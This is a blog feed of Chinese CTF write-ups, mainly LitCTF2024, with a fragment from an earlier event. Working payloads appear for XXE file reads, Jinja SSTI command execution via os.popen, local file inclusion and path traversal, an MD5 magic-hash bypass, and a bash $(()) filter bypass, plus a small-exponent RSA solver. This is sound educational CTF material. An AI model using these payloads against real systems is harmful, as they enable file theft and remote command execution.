punctuation">;</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> httpExchange<span class="token punctuation">.</span><span class="token function">getResponseBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">parseFormData</span><span class="token punctuation">(</span><span class="token class-name">String</span> body<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> kvPairs <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> kvPairs<span class="token punctuation">;</span>        <span class="token keyword">int</span> var5 <span class="token operator">=</span> kvPairs<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var6 <span class="token operator">&lt;</span> var5<span class="token punctuation">;</span> <span class="token operator">++</span>var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> kv <span class="token operator">=</span> var4<span class="token punctuation">[</span>var6<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> splits <span class="token operator">=</span> kv<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>splits<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> splits<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> params<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">readInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> is<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStreamReader</span> sr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> sr<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用来打SPEL的</p><hr><h2 id="NoCommonCollections-Unsolved"><a href="#NoCommonCollections-Unsolved" class="headerlink" title="NoCommonCollections (Unsolved)"></a>NoCommonCollections (Unsolved)</h2><hr><h2 id="Ezdotnet-Unsolved"><a href="#Ezdotnet-Unsolved" class="headerlink" title="Ezdotnet (Unsolved)"></a>Ezdotnet (Unsolved)</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;das偶遇b神出题，java&amp;amp;.net&amp;amp;python强如怪物，拼尽全力也无法战胜😭（也就是又爆零了）&lt;/p&gt;
&lt;p&gt;应该是近期最后一次打ctf了，剩下的事交给复现了&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#&quot;&gt;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>LitCTF2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/01/LitCTF2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/01/LitCTF2024/</id>
    <published>2024-06-01T02:17:30.000Z</published>
    <updated>2024-06-03T05:04:28.466Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是一年探姬杯</p><p>一眼秒了（</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h2><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601114123216.png" alt="image-20240601114123216"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'secure_password'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼反序列化，代码逻辑很简单，只需要让反序列化的结果<code>$this-&gt;username === &#39;admin&#39; &amp;&amp; $this-&gt;password === &#39;secure_password&#39;</code>即可</p><p>于是构造我们的payload，设置username和password的值即可：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'secure_password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601114406222.png" alt="image-20240601114406222"></p><hr><h2 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h2><p>给了登录框，抓包</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601113830003.png" alt="image-20240601113830003"></p><p>post报文是xml的格式，那么一眼xxe，读取flag即可</p><p>payload：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601114016450.png" alt="image-20240601114016450"></p><hr><h2 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h2><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601113446183.png" alt="image-20240601113446183"></p><p>无过滤ssti秒了，用<code>__subclasses__</code>查到我们需要的模块<code>os.wrap_close</code>，索引为137</p><p>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601113708859.png" alt="image-20240601113708859"></p><hr><h2 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h2><p>秒不掉！</p><p>一开始以为是打xss，然后测了半天</p><p>能带出cookie，但是是自己的</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;iframe src=file:///etc/passwd>&lt;/iframe>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>控制台回显<code>安全错误：位于 http://node1.anna.nssctf.cn:28107/ 的内容不可以加载或者链接至 file:///etc/passwd。 </code></p><p>后来想了想，真要打xss那可比其它几题难多了（</p><p>于是开始测各种协议，直接file协议读flag了</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601183735275.png" alt="image-20240601183735275"></p><hr><h2 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!==</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">></span> <span class="token number">2024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"好康的"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"干巴爹干巴爹先辈~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"开胃小菜))"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token number">240610708</span><span class="token operator">&amp;</span>c<span class="token operator">=</span><span class="token number">2025</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回<code>./dollar.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in 12.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z0-9;`|#'\"%&amp;\x09\x0a>&lt;.,?*\-=\\[\]]/i"</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$x</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了<code>$</code>和<code>()</code>以外ban的差不多了，那么就是利用linux下的取反构造命令<code>$(())</code>来构造出12</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601104705595.png" alt="image-20240601104705595"></p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>x<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>flag：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"LitCTF&#123;dollar_d0llar_d0ll@r!!!&#125;"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h2><p>按一下按钮</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601102412403.png" alt="image-20240601102412403"></p><p>发现post传入一个参数<code>theme</code></p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601102317116.png" alt="image-20240601102317116"></p><p>参数置空产生报错，发现是用了<code>include</code>包含文件，并且显示了包含的路径</p><p>尝试读&#x2F;etc&#x2F;passwd</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601102134482.png" alt="image-20240601102134482"></p><p>目录穿越得到flag</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601102103677.png" alt="image-20240601102103677"></p><hr><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="编码喵"><a href="#编码喵" class="headerlink" title="编码喵"></a>编码喵</h2><p>换表base64</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601144924786.png" alt="image-20240601144924786"></p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601144936359.png" alt="image-20240601144936359"></p><hr><h2 id="hello-upx-Unsolved"><a href="#hello-upx-Unsolved" class="headerlink" title="hello_upx (Unsolved)"></a>hello_upx (Unsolved)</h2><p><code>upx -d</code>秒不掉，得手动脱壳，开摆</p><hr><h2 id="ezrc4-Unsolved"><a href="#ezrc4-Unsolved" class="headerlink" title="ezrc4 (Unsolved)"></a>ezrc4 (Unsolved)</h2><p>开头上了个反调试</p><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">3</span>c_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> m <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    c_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c_list = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c_list<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''n = 19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229c_list = [438976, 1157625, 1560896, 300763, 592704, 343000, 1860867, 1771561, 1367631, 1601613, 857375, 1225043, 1331000, 1367631, 1685159, 857375, 1295029, 857375, 1030301, 1442897, 1601613, 140608, 1259712, 857375, 970299, 1601613, 941192, 132651, 857375, 1481544, 1367631, 1367631, 1560896, 857375, 110592, 1061208, 857375, 1331000, 1953125]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>e&#x3D;3，低指数加密秒了</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229</span>e <span class="token operator">=</span> <span class="token number">3</span>c_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">438976</span><span class="token punctuation">,</span> <span class="token number">1157625</span><span class="token punctuation">,</span> <span class="token number">1560896</span><span class="token punctuation">,</span> <span class="token number">300763</span><span class="token punctuation">,</span> <span 